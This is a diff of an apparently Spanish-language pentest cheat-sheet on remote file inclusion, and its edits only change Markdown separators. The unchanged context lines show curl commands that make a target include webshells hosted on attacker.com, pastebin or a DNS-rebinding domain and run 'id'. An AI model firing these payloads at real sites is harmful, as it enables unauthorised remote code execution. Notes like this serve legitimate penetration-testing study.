@@ -16,7 +16,7 @@ linked:
 ---
 # RFI - Hostear Payload Remote
 
-***
+---
 
 ## Webshell Setup Atacante
 
@@ -73,7 +73,7 @@ python3 -m http.server 80
 # curl 'https://target/index.php?page=http://attacker.com/shell.php&c=id'
 ```
 
-___
+---
 
 ## Polyglot Files
 
@@ -107,7 +107,7 @@ python3 -m http.server 80
 # curl 'https://target/index.php?page=http://attacker.com/shell.jpg&c=id'
 ```
 
-___
+---
 
 ## Public Payload Servers
 
@@ -139,7 +139,7 @@ curl -X POST 'https://pastebin.com/api/api_post.php' \
 curl "https://target/index.php?page=https://pastebin.com/raw/abcd1234&c=id"
 ```
 
-___
+---
 
 ## DNS Rebinding
 
@@ -159,4 +159,4 @@ ___
 | `curl --doh-url https://1.1.1.1/dns-query 'https://target/?page=http://rebind.attacker.com/shell.php'` | DoH bypass DNS filter | DoH variant. |
 ^rfi-host-dnsrebind
 
-***
+---
